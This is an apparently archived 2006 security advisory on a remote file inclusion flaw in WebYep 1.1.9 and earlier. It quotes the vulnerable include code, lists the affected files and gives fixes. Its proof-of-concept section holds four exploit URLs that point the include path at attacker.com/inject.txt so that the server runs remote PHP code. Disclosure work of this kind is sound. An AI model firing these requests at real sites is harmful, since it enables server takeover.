@@ -1,0 +1,106 @@
+ECHO_ADV_48$2006
+
+-----------------------------------------------------------------------------------------------
+[ECHO_ADV_48$2006] WebYep <= 1.1.9 (webyep_sIncludePath) Multiple Remote File Inclusion Vulnerability
+-----------------------------------------------------------------------------------------------
+
+Author          : Dedi Dwianto a.k.a the_day
+Date Found      : October, 05th 2006
+Location        : Indonesia, Jakarta
+web             : http://advisories.echo.or.id/adv/adv48-theday-2006.txt
+Critical Lvl    : Highly critical
+Impact          : System access
+Where           : From Remote
+---------------------------------------------------------------------------
+
+Affected software description:
+~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Application     : WebYep
+version         : <=1.1.9
+URL             : http://www.obdev.at
+
+WebYep is a compact Web Content Management System for extremely simple creation of editable
+web pages. It is a low priced alternative for small to medium web sites
+---------------------------------------------------------------------------
+
+Vulnerability:
+~~~~~~~~~~~~~
+
+In folder webyep-system/programm/lib found vulnerability script WYApplication.php
+---------------------------WYApplication.php---------------------------------------
+....
+<?
+
+ include_once("$webyep_sIncludePath/lib/WYApplication.php");
+ include_once("$webyep_sIncludePath/lib/WYHTMLTag.php");
+
+...
+----------------------------------------------------------
+
+Input passed to the "$webyep_sIncludePath" parameter in WYApplication.php is not
+properly verified before being used. This can be exploited to execute
+arbitrary PHP code by including files from local or external
+resources.
+
+Also affected files on Files:
+
+webyep-system/programm/lib/WYApplication.php
+webyep-system/programm/lib/WYDocument.php
+webyep-system/programm/lib/WYEditor.php
+webyep-system/programm/lib/WYElement.php
+webyep-system/programm/lib/WYFile.php
+webyepasystem/programm/lib/WYHTMLTag.php
+webyep-system/programm/lib/WYImage.php
+webyep-system/programm/lib/WYLanguage.php
+webyep-system/programm/lib/WYLink.php
+webyep-system/programm/lib/WYPath.php
+webyep-system/programm/lib/WYPopupWindowLink.php
+webyep-system/programm/lib/WYSelectMenu.php
+webyep-system/programm/lib/WYTextArea.php
+webyep-system/programm/elements/WYGalleryElement.php
+webyep-system/programm/elements/WYGuestbookElement.php
+webyep-system/programm/elements/WYImageElement.php
+webyep-system/programm/elements/WYLogonButtonElement.php
+webyep-system/programm/elements/WYLongTextElement.php
+webyep-system/programm/elements/WYLoopElement.php
+webyep-system/programm/elements/WYMenuElement.php
+webyep-system/programm/elements/WYShortTextElement.php
+webyep-system/programm/webyep.php
+
+Proof Of Concept:
+~~~~~~~~~~~~~~
+
+http://target.com/[webYep_path]/webyep-system/programm/lib/WYApplication.php?webyep_sIncludePath=http://attacker.com/inject.txt?
+http://target.com/[webYep_path]/webyep-system/programm/lib/WYDocument.php?webyep_sIncludePath=http://attacker.com/inject.txt?
+http://target.com/[webYep_path]/webyep-system/programm/webyep.php?webyep_sIncludePath=http://attacker.com/inject.txt?
+http://target.com/[webYep_path]/webyep-system/programm/elements/WYGalleryElement.php?webyep_sIncludePath=http://attacker.com/inject.txt?
+
+Solution:
+~~~~~~
+- Sanitize variable $webyep_sIncludePath on affected files.
+- Turn off register_globals
+
+Timeline:
+~~~~~~
+05 - 10 - 2006 Bugs Found
+05 - 10 - 2006 Vendor Contact
+09 - 10 - Public Disclosure
+
+---------------------------------------------------------------------------
+
+Shoutz:
+~~
+~ y3dips,moby,comex,z3r0byt3,K-159,c-a-s-e,S`to,lirva32,anonymous
+~ Jessy My Brain
+~ az001,boom_3x,mathdule,angelia
+~ newbie_hacker@yahoogroups.com
+~ #aikmel - #e-c-h-o @irc.dal.net
+------------------------------------------------------------------------
+---
+Contact:
+~~~
+    EcHo Research & Development Center
+    the_day[at]echo[dot]or[dot]id
+
+# milw0rm.com [2006-10-09]
